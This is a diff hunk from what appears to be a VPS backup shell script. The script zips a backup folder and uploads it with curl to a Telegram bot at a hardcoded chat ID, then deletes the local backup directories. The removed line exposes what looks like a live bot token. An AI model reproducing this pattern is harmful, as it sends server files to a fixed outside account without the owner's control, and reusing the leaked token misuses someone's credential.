@@ -126,7 +126,7 @@ zip -r $IP.zip backup > /dev/null 2>&1
 curl -F chat_id="481473615" -F document=@"$IP.zip" -F caption="Backup Bot Berhasil
 Your Domain : $domain
 Date       : $date
-Your IP VPS  : $IP" https://api.telegram.org/@backupcasper_bot6269067022:AAHuxwF-f99WLo2i04T-V6ze-E5CXXtzvs4/sendDocument &> /dev/null
+Your IP VPS  : $IP" http://telegram.me/@backupcasper_bot/sendDocument &> /dev/null
 
 rm -fr /root/backup &> /dev/null
 rm -fr /root/user-backup &> /dev/null
